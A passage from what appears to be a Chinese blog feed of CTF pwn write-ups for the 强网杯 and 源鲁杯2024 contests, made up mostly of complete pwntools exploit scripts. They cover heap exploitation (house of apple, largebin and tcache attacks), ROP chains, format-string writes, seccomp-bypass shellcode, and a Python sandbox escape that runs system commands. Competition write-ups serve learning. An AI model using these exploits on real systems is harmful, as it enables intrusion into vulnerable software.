add(9,0x38,p64(0) + p64(0x71) + b'\xdd\x55')
add(5,0x68,b'\x78')
add(12,0x68,b'\x00'*51 + p64(0xfbad1800) + p64(0)*3 + b'\x40')
libc = u64(r.recv(8)) - 3954240
print(&quot;libc = &quot;,hex(libc))
malloc_hook = libc + 3951376

add(4,0x68,b'\x78')
add(5,0x68,b'\x78')
add(10,0x68,b'\x78')
delete(4)
delete(5)
delete(4)
add(6,0x68,p64(malloc_hook - 35))
add(99,0x68,b'a')
add(99,0x68,b'a')
#gdb.attach(r)
backdoor = 0x000000000400AAA
add(9,0x68,b'a'*19 + p64(backdoor))
cmd(1)
r.recvuntil(b'idx???')
r.sendline(str(0).encode())
r.recvuntil(b'size???')
r.sendline(str(0x100).encode())
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[强网杯]]></title>
        <id>https://l1u66.github.io/post/qiang-wang-bei/</id>
        <link href="https://l1u66.github.io/post/qiang-wang-bei/">
        </link>
        <updated>2024-11-03T09:14:46.000Z</updated>
        <content type="html"><![CDATA[<h1 id="baby_heap">baby_heap</h1>
<p>程序是2.35的libc，增删改查功能都有，但是只能edit一次<br>
<img src="https://l1u66.github.io//post-images/1730625989781.png" alt="" loading="lazy"><br>
只能show一次<br>
<img src="https://l1u66.github.io//post-images/1730626006840.png" alt="" loading="lazy"><br>
只能add6个堆块，大小在0x500以上，下标从1开始，<br>
<img src="https://l1u66.github.io//post-images/1730625869786.png" alt="" loading="lazy"><br>
有UAF，free后也能edit和show<br>
<img src="https://l1u66.github.io//post-images/1730625970233.png" alt="" loading="lazy"><br>
第五个选项没啥用<br>
<img src="https://l1u66.github.io//post-images/1730627002423.png" alt="" loading="lazy"><br>
程序还给了一个类似于后门的选项<br>
<img src="https://l1u66.github.io//post-images/1730625650896.png" alt="" loading="lazy"><br>
但是有个检查<img src="https://l1u66.github.io//post-images/1730625694248.png" alt="" loading="lazy"><br>
动调看了下范围，发现能写的地址范围没啥有用的<br>
还开了沙盒<br>
<img src="https://l1u66.github.io//post-images/1730626306949.png" alt="" loading="lazy"></p>
<h2 id="攻击思路">攻击思路</h2>
<p>2.35的libc没有了各种hook，所以需要打io，程序易通过exit函数退出，易触发FSOP，首先选择打house of apple，有edit就可以打largebin attack了，需要add5个堆块，中间可以show一个largebin里的堆块泄露出libc和heap地址，劫持_IO_list_all，但是此时_IO_list_all里的伪造的io是第二次进入largebin的堆块，而只有一次edit机会已经用在了largebin attack上，此时还有一次add的机会，把此堆块申请出来就可以使_IO_list_all里的伪造的io指向第一次进入largebin的堆块，就可以被我们控制，伪造io时发现_IO_wfile_jumps被置0了，所以用_IO_wfile_jumps_mmap来调用_IO_wfile_overflow，程序开了沙盒，禁用了open和openat，使用openat2绕过即可，不能直接拿到shell，所以伪造io使用svcudp_reply的gadgets调用mprotect使堆地址可执行，写入shellcode执行即可</p>
<pre><code>from pwn import *

context(os='linux',arch='amd64',log_level='debug')
# io = process('./pwn')
io = remote(&quot;59.110.159.153&quot;,35015)
e = ELF('./pwn')
lib = e.libc

def dbg():
    gdb.attach(io)


def cmd(choice):
    io.sendlineafter('Enter your choice: \n',str(choice).encode())

# 大小在0x500以上
# 6个 从1开始
def add(size):
    cmd(1)
    io.sendlineafter('Enter your commodity size \n',str(size).encode())

def edit(idx,payload):
    cmd(3)
    io.sendlineafter('Enter which to edit: \n',str(idx).encode())
    io.sendlineafter('Input the content \n',payload)

def delete(idx):
    cmd(2)
    io.sendlineafter('Enter which to delete: \n',str(idx).encode())
    
def show(idx):
    cmd(4)
    io.sendlineafter('Enter which to show: \n',str(idx).encode())

# 任意地址写
def magic(addr,con):
    cmd(6)
    io.sendlineafter('Input your target addr \n',p64(addr))
    io.send(p64(con))


add(0x528)#1
add(0x528)#2
add(0x518)#3
delete(1)
add(0x620)#4
show(1)

io.recvuntil(&quot;The content is here \n&quot;)
libc = u64(io.recv(8)) 
libc_base = libc - 0x21b110
print(&quot;libc_base = &quot;,hex(libc_base))
io.recv(8)
heap = u64(io.recv(8)) 
heap_base = heap - 0x950
print(&quot;heap_base = &quot;,hex(heap_base))

strerr = 0x21b860 + libc_base
fake_io_addr = 2384 + heap_base
lock = libc_base + 0x21ba60
_IO_list_all = libc_base + lib.sym['_IO_list_all']
io_wfile_jumps = libc_base + lib.sym['_IO_wfile_jumps'] - 0xc0
magic_gadget = libc_base + 0x000000000016a06a
add_rsp_ret=libc_base+0x000000000003a889        #0x18
leave_ret = libc_base + 0x000000000004da83
&quot;&quot;&quot;
&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]
&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]
&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0
&lt;svcudp_reply+45&gt;:    mov    rdi,r13
&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]
&quot;&quot;&quot;
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_r12 = libc_base + 0x000000000011f2e7
mprotect = libc_base + 0x00000000011EAA0
# openat2 
sh=f'''
mov rax, 0x67616c66 /*  /flag   */
push rax
xor rdi, rdi
sub rdi, 100
mov rsi, rsp
push 0
push 0
push 0
mov rdx, rsp
mov r10, 0x18
push 437
pop rax
syscall

mov rdi,rax
mov rsi,rsp
push 0x100
pop rdx
xor eax,eax
syscall

xor rdi,rdi
inc rdi
mov rax,rdi
syscall
'''

rop=p64(pop_rdi)
rop+=p64(heap - 0x950)
rop+=p64(pop_rsi)
rop+=p64(0x1000)
rop+=p64(pop_rdx_r12)
rop+=p64(7)
rop+=p64(0)
rop+=p64(mprotect)
rop+=p64(fake_io_addr + 0x370)

fake_io_file = p64(0)*2 + p64(1) + p64(_IO_list_all - 0x20)
fake_io_file = fake_io_file.ljust(
    0x48 - 0x10, b'\0') + p64(fake_io_addr + 0x300) + p64(leave_ret)  # rbp
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b'\0') + p64(fake_io_addr + 0x100)  # _wide_data (A)
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b'\0') + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b'\0') + p64(io_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b'\0') + p64(fake_io_addr + 0x200)  # B
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b'\0') + p64(0)*13 + p64(magic_gadget)  # C
fake_io_file = fake_io_file.ljust(
    0x300 - 0x10, b'\0') + p64(0) + p64(add_rsp_ret)
fake_io_file = fake_io_file.ljust(
    0x318 - 0x10, b'\0') + p64(fake_io_addr + 0x28) + p64(0) + rop  # rax
fake_io_file += asm(sh)

edit(1,fake_io_file)
delete(3)
add(0x620)#5
add(0x518)#6
print(&quot;_IO_list_all = &quot;,hex(_IO_list_all))
print(&quot;fake_io_addr = &quot;,hex(fake_io_addr))
print(sh)
# gdb.attach(io)
cmd(4)

io.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[源鲁杯2024]]></title>
        <id>https://l1u66.github.io/post/yuan-lu-bei-2024/</id>
        <link href="https://l1u66.github.io/post/yuan-lu-bei-2024/">
        </link>
        <updated>2024-10-25T16:04:33.000Z</updated>
        <content type="html"><![CDATA[<p>浅浅拿个二等奖😋<br>
<img src="https://l1u66.github.io//post-images/1729873236149.png" alt="" loading="lazy"></p>
<h1 id="round-1">Round 1</h1>
<h2 id="round-1-canary_orw">[Round 1] canary_orw</h2>
<p>ida打开程序发现有个hint函数，里面有个汇编jmp rsp，并且发现栈可执行，所以得知打shellcode，并且开了沙盒，没有任何过滤</p>
<pre><code>from pwn import *
from LibcSearcher import LibcSearcher
context(log_level='debug',arch='amd64',os='linux')

p = process('./canary')
elf = ELF('./canary')

vuln = 0x000000000400820
jmp_rsp = 0x00000000040081B
# xor eax,eax 
# add rdx,0x60
# syscall
payload = p64(jmp_rsp) + b&quot;\x31\xc0\x31\xff\x48\x83\xc2\x60\x0f\x05&quot;
# gdb.attach(p)
p.sendafter(&quot;Say some old spells to start the journey\n&quot;, payload)
shellcode='''
	xor rax, rax   #xor rax,rax是对rax的清零运算操作
	xor rdi, rdi   #清空rdi寄存器的值
	xor rsi, rsi   #清空rsi寄存器的值
	xor rdx, rdx
	mov rax, 2      #open调用号为2
	mov rdi, 0x67616c662f2e   #为galf/.为./flag的相反0x67616c662f2e为/flag的ASCII码的十六进制
	push rdi
	mov rdi, rsp
    xor rsi, rsi
	syscall   #系统调用前，linux在eax寄存器里写入子功能号，断止处理程序根据eax寄存器的值来判断用户进程申请哪	类系统调用。
	mov rdx, 0x100   #sys_read(3,file,0x100)
	mov rsi, rdi
	mov rdi, rax
	mov rax, 0      #read调用号为0,0为文件描述符，即外部输入，例如键盘
	syscall
	mov rdi, 1      #sys_write(1,file,0x30)
	mov rax, 1      #write调用号为1,1为文件描述符，指的是屏幕
	syscall
'''
shellcode = asm(shellcode)
print(shellcode)
pause()
p.send(b'./flag\x00\x00' + shellcode)
p.interactive()
</code></pre>
<h2 id="round-1-ezfmt">[Round 1] ezfmt</h2>
<p>一次栈溢出外加一次格式化字符串，通过栈溢出可以触发多次格式化字符串,本来想改printf的got表，但是read的字节数貌似不太够，想到有one_gadgets，第二个即可拿到shell</p>
<pre><code>from pwn import *
from LibcSearcher import *
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)

p = process(&quot;./pwn&quot;)
elf = ELF(&quot;./pwn&quot;)

bss = 0x000000000404060 + 0x700
main = 0x00000000040120D
printf = 0x000000000404020

# gdb.attach(p)
payload = b&quot;%13$paaa&quot;
payload = payload.ljust(32,b'a')
payload += p64(bss) + p64(main)
p.sendafter(&quot;welcome to YLCTF\n&quot;,payload)

p.recvuntil(&quot;0x&quot;)
__libc_start_main = int(p.recv(12),16) - 243
print(&quot;__libc_start_main = &quot;,hex(__libc_start_main))
base = __libc_start_main - 147344
print(&quot;base = &quot;,hex(base))
sys = base + 0x000000000052290
print(&quot;sys = &quot;,hex(sys))
one = [0xe3afe, 0xe3b01, 0xe3b04]

x1 = sys &amp; 0xffff
payload = b'%' + str(x1).encode(&quot;utf-8&quot;) + b'c' + b'%7$hn'
x2 = (sys &gt;&gt; 8) &amp; 0xff
payload += b'%' + str(0x100 + x2 - x1).encode(&quot;utf-8&quot;) + b'c' + b'%8$hhn'
payload = payload.ljust(0x20,b'\x00')
payload += p64(printf) + p64(printf + 4)
pause()
p.sendline(b'a'*32 + p64(0) + p64(base + one[1]))

p.interactive()
</code></pre>
<h2 id="round-1-ezheap">[Round 1] ezheap</h2>
<h3 id="非预期">非预期</h3>
<p>这题也是抽象，用网站去接受脚本本地运行出结果，还写明了&lt;请勿带有os和subprocess&gt;，经过print(1)测试后发现直接回显，就想到python沙箱逃逸，拷打gpt得到<br>
<img src="https://l1u66.github.io//post-images/1729872506628.png" alt="" loading="lazy"></p>
<p>测试后不行，觉得应该是吧os字符过滤掉了，直接空字符绕过</p>
<pre><code>sys = __import__('o''s')
sys.system('cat flag')
</code></pre>
<p>直接拿到flag了......</p>
<h3 id="预期解">预期解</h3>
<p>该程序有一次任意地址写一大数的机会，可以覆盖mp扩大tcachebin的范围，这个指针会会按照地址顺延到高地址处的chunk，会被我们控制，从而让我们拥有任意地址写的能力，从而获取shell。</p>
<h4 id="寻找mp_">寻找mp_</h4>
<p><code>p mp_</code>打印出mp_结构体，覆盖偏移0x50的tcache_bins即可</p>
<pre><code>
from pwn import*
from ctypes import *
from struct import *

io = process(&quot;./pwn&quot;)
context(log_level='debug',arch='amd64',os='linux')

libc = ELF(&quot;./libc-2.31.so&quot;)

elf = ELF(&quot;./pwn&quot;)
menu=&quot;Input your choice&quot;
def add(size,cont):
    io.sendlineafter(menu,str(1))
    io.sendlineafter(&quot;Size :&quot;,str(size))
    io.sendafter(&quot;Content :&quot;,cont)

def delete(idx):
    io.sendlineafter(menu,str(2))
    io.sendlineafter(&quot;Index :&quot;,str(idx))

def edit(addr):
    io.sendlineafter(menu,str(3))
    io.sendafter(&quot;content :&quot;,addr)

def show(idx):
    io.sendlineafter(menu,str(4))
    io.sendlineafter(&quot;Index :&quot;,str(idx))

add(0x500,b'a') 
add(0x500,b'/bin/sh\x00') 
add(0x500,b'a') 
add(0x500,b'a') 
add(0x100,b'a') 
delete(2)
add(0x500,b'a'*8) 
show(5)
io.recvuntil(b'a'*8)
libcbase=u64(io.recv(6).ljust(8,b&quot;\x00&quot;))-0x1ecbe0
print(hex(libcbase))
free_hook= libcbase +libc.sym['__free_hook']
system=libcbase+libc.sym['system']
#gdb.attach(io)
mp=libcbase+0x1EC280+0x50
print(hex(free_hook))
edit(p64(mp))
delete(3)
delete(0)
add(0x500,p64(0)*13+p64(free_hook)) 
#gdb.attach(io)
add(0x500,p64(system))

delete(1)


io.interactive()
</code></pre>
<h2 id="round-1-ezorw">[Round 1] ezorw</h2>
<p>就是开了沙盒的shellcode<br>
<img src="https://l1u66.github.io//post-images/1729872756053.png" alt="" loading="lazy"><br>
随便绕一下</p>
<pre><code>from pwn import *
from LibcSearcher import *
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)

p = process(&quot;./pwn&quot;)
elf = ELF(&quot;./pwn&quot;)
libc = elf.libc

payload = asm(shellcraft.openat(0xffffff9c,b&quot;flag&quot;,0))	
#payload = asm(shellcraft.openat(-100,b&quot;flag&quot;,0))	
#-100 AT_FDCWD 表示当前目录
payload += asm(shellcraft.pread(3,0x114514000,0x100,0))	
payload += asm(shellcraft.sendfile(1,3,0,0x100))

p.sendafter(&quot;welcome to YLCTF orw~\n&quot;,payload)
p.interactive()
</code></pre>
<h2 id="round-1-ezstack">[Round 1] ezstack</h2>
<p>通过栈溢出可以使程序运行到vuln函数，对system函数的命令禁用了s,h,c,f字符，直接/???/?at *lag能拿到flag</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process(&quot;./pwn&quot;)
#gdb.attach(p)
vuln = 0x00000000040127A
p.sendafter(&quot;good stack\n&quot;,b'a'*0x30 + p64(0) + p64(vuln))
p.sendafter(&quot;input your command\n&quot;,b&quot;/???/?at *lag&quot;)
p.interactive()

</code></pre>
<h2 id="round-1-giaopwn"><strong>[Round 1] giaopwn</strong></h2>
<p>签到</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process(&quot;./pwn&quot;)
#gdb.attach(p)
system = 0x0000000004006D2
cmd = 0x000000000601048
rdi = 0x0000000000400743
ret = rdi + 1
p.sendafter(&quot;welcome to YLCTF\n&quot;,b'a'*32 + p64(0) + p64(rdi) + p64(cmd) + p64(system))

p.interactive()
</code></pre>
<h2 id="round-1-msg_bot"><strong>[Round 1] msg_bot</strong></h2>
<p>打开程序发现是一道protobuf的pwn题，手动分析出proto文件</p>
<pre><code>syntax=&quot;proto3&quot;; //proto version 2 or 3

message msgbot{
    int64 msgid = 1;
    int64 msgsize = 2;
    bytes msgcontent = 3;
}
</code></pre>
<p>利用<code>protoc bot.proto --python_out=./</code>命令生成python语言的代码，得到一个python文件，可以在exp中导入，构建相应的protobuf包，分析程序发现如果要想执行到shellcode，需要满足msgid=3235839725，msgsize=4027448014，通过调试发现输入的shellcode每个字节需要在0x1f和0x7f之间，都需要是可见字符，而且还限制了shellcode的长度，但是长度放的非常多，不用怎么管，直接用alpha3生成即可，构造一个shellcode的再次读入，后面读入的shellcode的限制就没有了，但是程序还开了沙盒<img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1728627907038.png" alt="1728627907038" loading="lazy"></p>
<p>没办法使用打开文件的操作，但是允许了一个fstat的函数，可以知道是要利用retfq把程序转化为32位系统，此时的open函数的系统调用号就是5，就可以打开文件了，然后再转化到64位系统调用read和write函数即可打印出flag，具体转化的细节慢慢调试就可以</p>
<pre><code>from pwn import *
import bot_pb2
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
# p = process(&quot;./msg_bot&quot;)
p = remote(&quot;challenge.yuanloo.com&quot;,29472)
elf = ELF(&quot;./msg_bot&quot;)

# re_read
# from pwn import *

# payload = shellcraft.amd64.read(0, &quot;rdi&quot;, 0x6666)
# f = open('mmap_read', 'wb')
# f.write(asm(payload, arch = 'amd64', os = 'linux'))
# f.close()

data = bot_pb2.msgbot()
data.msgid = 3235839725
data.msgsize = 4027448014
data.msgcontent = b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M1L3a144z5o108K15380S3E0W0V070N01'
data = data.SerializeToString()
# gdb.attach(p,&quot;b *$rebase(0x0000000000017C9)&quot;)
p.sendafter(&quot;botmsg: &quot;,data)

re_read = asm('''
              push 0x23
              add rcx,5
              push rcx
              retfq
              mov rsp,rcx
''')

# sc = shellcraft.i386.open(&quot;/flag&quot;)
sc = b'h\x01\x01\x01\x01\x814$`f\x01\x01h./fl\xb8\x05\x00\x00\x00\x89\xe31\xc9\xcd\x80'
re_read += sc

re_read1 = asm('''
               push 0x33
               add rsi,0x7a
               push rsi
               retfq
               mov rsp,rbx
''')
re_read += re_read1

rw = shellcraft.amd64.read(0x3, &quot;rbx&quot;, 0x40)
rw += shellcraft.amd64.write(0x1, &quot;rbx&quot;, 0x40)
rw = asm(rw)
re_read += rw
pause()

p.send(b'a'*0x49 + re_read)
p.interactive()
</code></pre>
<h1 id="round-2">Round 2</h1>
<h2 id="round-2-canary">[Round 2] canary</h2>
<p>选项二可以直接改rbp和ret指令，可以跳过canary，把栈控制到bss段上，然后留下一个要跳入的地址到bss里，留下的方法就是把地址放在rbp的位置上，如果放到ret指令处，那么在程序执行过程中就会改变，然后把rbp迁到stack_chk_fail的got表上方，把stack_chk_fail的got表改为leave ret，然后借助留在bss的地址跳到gift函数，后面面就是常规的ret2libc</p>
<pre><code>from pwn import *
from LibcSearcher import LibcSearcher
context(log_level='debug',arch='amd64',os='linux')

# p = process('./pwn')
p = remote('challenge.yuanloo.com',33016)
# elf = ELF('./pwn')
bss = 0x000000000404060 + 0x900
got1 = 0x000000000404020
got = 0x000000000404028
main = 0x000000000401296
choice_1 = 0x000000000401258
choice_2 = 0x00000000040133F
leave = 0x0000000000401288

p.sendlineafter(&quot;Do you want to enter other functions?\n&quot;, b'2')
payload = p64(bss - 0x10) + p64(main)
p.send(payload)
p.sendlineafter(&quot;Do you want to enter other functions?\n&quot;, b'2')
pay = p64(bss + 0x20) + p64(main)
p.send(pay)
p.sendlineafter(&quot;Do you want to enter other functions?\n&quot;, b'2')
pay = p64(0x000000000401241) + p64(0x00000000040128F)
p.send(pay)
# gdb.attach(p)
p.sendlineafter(&quot;Do you want to enter other functions?\n&quot;, b'2')
pay = p64(got) + p64(choice_2)
p.send(pay)
pay = p64(0x404978) + p64(leave)
p.send(pay)


puts_plt = 0x0000000004010A0
puts_got = 0x000000000404018
main_addr = 0x000000000401258
pop_rdi_ret = 0x00000000004013e3
ret = pop_rdi_ret + 1

#gdb.attach(p)

payload = b'a'*64 + p64(bss) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.send(payload)

puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - 0x000000000084420
system_addr = libc_base + 0x000000000052290
bin_addr = libc_base + 0x0000000001B45BD
onegadget = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_gadget = libc_base + onegadget[5]#3 4 

print(&quot;base = &quot;,hex(libc_base))
print(&quot;sys = &quot;,hex(system_addr))
print(&quot;bin = &quot;,hex(bin_addr))

#gdb.attach(p)
#pause()
pay = b'b'*64 + p64(bss) + p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
p.send(pay)

p.interactive()
</code></pre>
<h2 id="round-2-futureheap">[Round 2] futureheap</h2>
<p><img src="https://l1u66.github.io//post-images/1729872807789.png" alt="" loading="lazy"><br>
先看init函数，发现有伪随机、可执行段、一堆异或和一个沙盒，沙盒是禁用了execve、open和write，直接openat、sendfile绕过即可，有mmap为7的段得知打shellcode，这里注意直接把随机数种子布置为time(0)产生的随机数不太一样，随机数前两位题目已经给出，爆破随机数种子即可，然后就可以根据异或得到libc基地址和mmap申请的地址了，然后看主逻辑<br>
<img src="https://l1u66.github.io//post-images/1729872958655.png" alt="" loading="lazy"></p>
<p>如注释所示，还存在uaf漏洞，大小有限制，整个程序的while部分无回显，也无法泄露堆地址，可以利用house of apple，利用一次largebin attack劫持io结构体，把 wide_data 劫持到mmap申请的地址，因为堆地址不知道，mmap的地址知道并且可写，然后在mmap的地址里写入伪造的wide_data ，后面写上shellcode，劫持程序执行写入的shellcode即可</p>
<pre><code>from pwn import *
import ctypes

context(os='linux',arch='amd64',log_level='debug')
# io = process('./pwn')
io = remote(&quot;challenge.yuanloo.com&quot;,25509)
e = ELF('./pwn')
libc = e.libc

def dbg():
    gdb.attach(io)


def cmd(choice):
    io.sendline(str(choice).encode())

# 大小在0x90-0x1000
# 32个
def add(idx,size):
    cmd(1)
    sleep(0.5)
    io.sendline(str(idx).encode())
    sleep(0.5)
    io.sendline(str(size).encode())

def edit(idx,payload):
    cmd(2)
    sleep(0.5)
    io.sendline(str(idx).encode())
    sleep(0.5)
    io.sendline(payload)

def delete(idx):
    cmd(3)
    sleep(0.5)
    io.sendline(str(idx).encode())
    
def shellcode(payload):
    cmd(4)
    sleep(0.5)
    io.sendline(b'74r0t#C@rd')
    sleep(0.5)
    # pause()
    io.sendline(payload)

def exit():
    cmd(5)


# gdb.attach(io,&quot;b *$rebase(0x0000000000019FF)&quot;)
lib = ctypes.CDLL('./1.so')

lib.random_number.restype = ctypes.c_int

io.sendlineafter(&quot;Tell me your name, my dear: \n&quot;,b&quot;aaaaaaaa&quot;)

io.recvuntil(&quot;Wolf is &quot;)
wolf = int(io.recvuntil(&quot;.\n&quot;, drop = True))
print(wolf)

io.recvuntil(&quot;Sword is &quot;)
Sword = int(io.recvuntil(&quot;.\n&quot;, drop = True))
print(Sword)

io.recvuntil(&quot;Lion is &quot;)
Lion = int(io.recvuntil(&quot;.\n&quot;, drop = True))
print(Lion)

io.recvuntil(&quot;Snake is &quot;)
Snake = int(io.recvuntil(&quot;.\n&quot;, drop = True))
print(Snake)

seed = lib.set_seed(wolf,Sword)
random1 = lib.random_number(seed)
print(&quot;random1 = &quot;,random1)
random2 = lib.random_number1(seed)
print(&quot;random2 = &quot;,random2)
random3 = lib.random_number2(seed)
print(&quot;random3 = &quot;,random3)
random4 = lib.random_number3(seed)
print(&quot;random4 = &quot;,random4)

setvbuf = wolf ^ random3 ^ Lion
print(&quot;setvbuf = &quot;,hex(setvbuf))
libcbase = setvbuf - 0x0815f0
print(&quot;libcbase = &quot;,hex(libcbase))
fortune = Sword ^ random4 ^ Snake
print(&quot;fortune = &quot;,hex(fortune))

_IO_list_all = libcbase + libc.sym['_IO_list_all']
io_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']

add(0, 0x528)
add(1, 0x528)
add(2, 0x518)
delete(0)
add(3, 0x620)
edit(0, p64(0) + p64(0) + p64(0) + p64(_IO_list_all - 0x20))
delete(2)
# gdb.attach(io)
add(4, 0x620)

payload = b'\x00'*0xe0 + p64(fortune + 0x200)
payload += asm(shellcraft.openat(0xffffff9c,b&quot;flag&quot;,0))	
payload += asm(shellcraft.pread(3,fortune + 0x400,0x100,0))	
payload += asm(shellcraft.sendfile(1,3,0,0x100))
payload = payload.ljust(0x200,b'\x00')
payload += b'\x00'*0x68 + p64(fortune + 0xe8)

shellcode(payload)
fake_io_file = p64(0)*2 + p64(1) + p64(2)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b'\0') + p64(fortune)  # _wide_data (A)
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b'\0') + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b'\0') + p64(io_wfile_jumps)  # vtable

cmd(2)
sleep(0.5)
io.sendline(b'2')
sleep(0.5)
io.sendline(fake_io_file)
sleep(0.5)
io.sendline(b'4')
io.interactive()
</code></pre>
<h2 id="round-2-magicread">[Round 2] magicread</h2>
<p>查看程序只有一个read且溢出了0x10个字节，打栈迁移，迁移两次，一次泄露libc地址一次得到shell，由于需要再次read所以直接利用main函数</p>
<pre><code>from pwn import *
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)

# p = process(&quot;./pwn&quot;)
p = remote(&quot;challenge.yuanloo.com&quot;,21148)
#elf = ELF(&quot;./pwn&quot;)

rdi = 0x0000000000400723
rsi_r15 = 0x0000000000400721
rbp = 0x0000000000400578
bss = 0x00000000601040 + 0x500
puts = 0x0000000004004E0
got = 0x000000000601018
leave = 0x0000000000400691

# gdb.attach(p)

payload = b'a'*0x40 + p64(bss + 0x100) + p64(0x000000000400675)
p.sendafter(&quot;just read!\n&quot;,payload)

pay = p64(rdi) + p64(got) + p64(puts) + p64(rbp) + p64(bss+0x300+0x100) + p64(0x000000000400675)
pay = pay.ljust(0x40,b'\x00') + p64(0x601600 - 8) + p64(leave)
p.send(pay)
read_addr = u64(p.recv(6).ljust(8,b'\x00'))
print(hex(read_addr))
libc_base = read_addr - 0x00000000006F6A0
print(hex(libc_base))

#onegadget = [0xe3afe,0xe3b01,0xe3b04]
#one_gadget = libc_base + onegadget[0]

system = libc_base + 0x0000000000453A0
bin_sh = libc_base + 0x00000000018CE57
pay3 =(b'a'*8 + p64(rdi) + p64(bin_sh) + p64(rdi+1) + p64(system)).ljust(0x40,b'\x00')
pay3 += p64(0x601900) + p64(leave)
p.send(pay3)
pause()
p.sendline(b&quot;cat flag&quot;)

p.interactive()
</code></pre>
<h2 id="round-2-ezstack2"><strong>[Round 2] ezstack2</strong></h2>
<p>ret2libc</p>
<pre><code>from pwn import *
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)

#p = process('./pwn')
p = remote(&quot;challenge.yuanloo.com&quot;,39989)
#elf = ELF('./pwn')

puts_plt = 0x000000000400580
puts_got = 0x000000000601018
main_addr = 0x000000000400739
pop_rdi_ret = 0x0000000000400823
ret = 0x000000000040056e
bss = 0x000000000601060 + 0x700
#gdb.attach(p)

payload = b'a'*0x30 + p64(bss) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(&quot;good stack\n&quot;,payload)

puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - 0x84420
system_addr = libc_base + 0x52290
bin_addr = libc_base + 0x1b45bd
onegadget = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_gadget = libc_base + onegadget[5]#3 4 

print(&quot;base = &quot;,hex(libc_base))
print(&quot;sys = &quot;,hex(system_addr))
print(&quot;bin = &quot;,hex(bin_addr))

# gdb.attach(p)

pause()
pay = b'a'*0x30 + p64(0x404220) + p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
p.send(pay)

p.interactive()
</code></pre>
<h2 id="round-2-shortshell"><strong>[Round 2] shortshell</strong></h2>
<p>读入五个字节的shellcode，存在后门函数，让程序跳到后门函数即可，基地址好像不一样，调整一下偏移即可</p>
<pre><code>from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p = remote(&quot;challenge.yuanloo.com&quot;,43268)
#p = process(&quot;./pwn&quot;)

#gdb.attach(p)
payload = b&quot;\xE9\x02\xd2\xff\xff&quot;
p.sendafter(&quot;Welcome to YLCTF-PWN\n&quot;, payload)

p.interactive()
</code></pre>
<h1 id="round-3">Round 3</h1>
<h2 id="round-3-secret">[Round 3] Secret</h2>
<p>nc后输入”SuperSecretPassword\n“即得flag</p>
<h2 id="round-3-ezstack3">[Round 3] ezstack3</h2>
<p>32位，没开PIE，有system函数<img src="https://l1u66.github.io//post-images/1729873036427.png" alt="" loading="lazy"></p>
<p>第一次read用来泄露栈地址，在栈上写入/bin/sh即可知道其地址，第二次read构造ROP链就行</p>
<pre><code>from pwn import *
from LibcSearcher import *
context(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)

flag=1
if flag==1:
	p = process(&quot;./pwn&quot;)
else:
	p = remote(&quot;challenge.yuanloo.com&quot;,30305)

bss = 0x804C02C
pay = b'a'*48
p.sendafter(&quot;Welcome to YLCTF stack3&quot;,pay)
p.recv(48)
stack = u32(p.recv(4))
print(&quot;stack = &quot;,hex(stack))

edi_ebp = 0x080493c2
sys = 0x80490C0
sh = stack - 52
leave = 0x08049185
ret = 0x0804900e

payload =  p32(sys) + p32(bss+0x500) + p32(sh) + b'/bin/sh\x00'
payload = payload.ljust(48)
payload += p32(stack - 68) + p32(leave)
gdb.attach(p)

p.send(payload)

p.interactive()
</code></pre>
<h2 id="round-3-null">[Round 3] null</h2>
<p>2.27版本的off by null，构造unlink实现堆覆盖之后劫持free_hook为onegadget即可</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
# io = process('./pwn')
io = remote(&quot;challenge.yuanloo.com&quot;,29653)
e = ELF('./pwn')
libc = e.libc
one = [0xe6aee, 0xe6af1, 0xe6af4]


def dbg():
    gdb.attach(io)


def cmd(choice):
    io.recvuntil(b':')
    io.sendline(str(choice).encode())

# 大小在0x90-0x1000
# 32个
def add(idx,size):
    cmd(1)
